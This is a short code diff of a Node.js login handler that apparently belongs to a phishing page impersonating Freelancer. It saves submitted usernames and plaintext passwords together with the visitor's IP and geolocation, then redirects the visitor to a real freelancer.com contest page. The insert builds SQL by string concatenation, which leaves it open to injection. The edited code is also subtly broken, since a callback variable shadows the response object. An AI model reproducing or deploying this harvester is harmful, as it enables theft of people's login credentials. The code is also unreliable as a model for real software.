@@ -61,11 +61,13 @@ app.post('/login',function(req,res){
     req.socket.remoteAddress ||
     (req.connection.socket ? req.connection.socket.remoteAddress : null);
 
-    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res)});
-    var location = loc + '---' + city + '---' + reg ;
+    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res);
+        var location = loc + '---' + city + '---' + reg ;
+    
+        client.query("INSERT INTO freelancer_users (users,password,ip,country) VALUES ('" + a + "','" + b + "','" + ip + "','"+location+"')",function(err,result){});
+        res.redirect('https://www.freelancer.com/contest/Design-a-logo-for-an-Accounting-Firm-1460786-byentry-25383803?w=f');
+    });
 console.log('location **:**'+location);
-    client.query("INSERT INTO freelancer_users (users,password,ip,country) VALUES ('" + a + "','" + b + "','" + ip + "','"+location+"')",function(err,result){});
-    res.redirect('https://www.freelancer.com/contest/Design-a-logo-for-an-Accounting-Firm-1460786-byentry-25383803?w=f');
 })
 
 
